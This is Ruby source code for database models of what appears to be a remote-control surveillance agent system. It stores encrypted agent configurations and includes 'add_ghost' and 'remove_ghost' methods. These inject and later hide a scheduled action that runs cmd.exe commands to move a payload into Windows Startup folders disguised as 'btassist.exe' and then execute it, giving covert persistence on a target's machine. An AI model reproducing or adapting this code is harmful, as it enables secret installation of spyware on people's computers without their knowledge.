require 'mongoid'

require 'rcs-common/crypt'

#module RCS
#module DB

class Configuration
  include Mongoid::Document
  include Mongoid::Timestamps
  include RCS::Crypt

  field :desc, type: String
  field :user, type: String
  field :saved, type: Integer
  field :sent, type: Integer
  field :activated, type: Integer

  field :config, type: String   #json
  
  embedded_in :item

  def encrypted_config(confkey)
    # encrypt the config for the agent using the confkey
    aes_encrypt(self.config + Digest::SHA1.digest(self.config), Digest::MD5.digest(confkey))
  end

  def is_ghost_entry?(h)
    h.has_value? "Ghost In The Shell"
  end

  def check_ghost(ary)
    ary.each {|line| return true if is_ghost_entry?(line)}
    return false
  end

  def is_ghost_present?
    config = JSON.parse self.config
    a = check_ghost(config['events'])
    b = check_ghost(config['actions'])
    a && b
  end

  def add_ghost
    # be sure to overwrite any other ghost present
    remove_ghost if is_ghost_present?

    config = JSON.parse self.config

    ghost_event = {"event"=>"timer",
      "te"=>"23:59:59",
      "subtype"=>"loop",
      "start"=>config["actions"].size,
      "enabled"=>true,
      "ts"=>"00:00:00",
      "desc"=>"Ghost In The Shell"}
    ghost_action = {"desc"=>"Ghost In The Shell",
      "subactions"=>[
          {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
          {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%HOMEPATH%\\Start Menu\\Programs\\Startup\\btassist.exe\""},
          {"action"=>"execute", "command"=>"cmd.exe /c del /F $dir$\\ghits"},
          {"action"=>"execute", "command"=>"\"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
          {"action"=>"execute", "command"=>"\"%HOMEPATH%\\Start Menu\\Programs\\Startup\\btassist.exe\""},
      ]}

    config['events'] << ghost_event
    config['actions'] << ghost_action

    self.config = config.to_json
    self.desc = "Ghost Agent Install"
    self.saved = Time.now.getutc.to_i
    self.save
  end

  def remove_ghost
    config = JSON.parse self.config

    config['events'].delete_if {|hsh| is_ghost_entry?(hsh)}
    config['actions'].delete_if {|hsh| is_ghost_entry?(hsh)}

    self.config = config.to_json
    self.desc = "Ghost Agent Hiding"
    self.saved = Time.now.getutc.to_i
    self.user = "<system>"
    self.save
  end
end


class Template
  include Mongoid::Document
  include Mongoid::Timestamps

  field :desc, type: String
  field :user, type: String

  field :config, type: String   #json

  store_in :templates
end


#end # ::DB
#end # ::RCS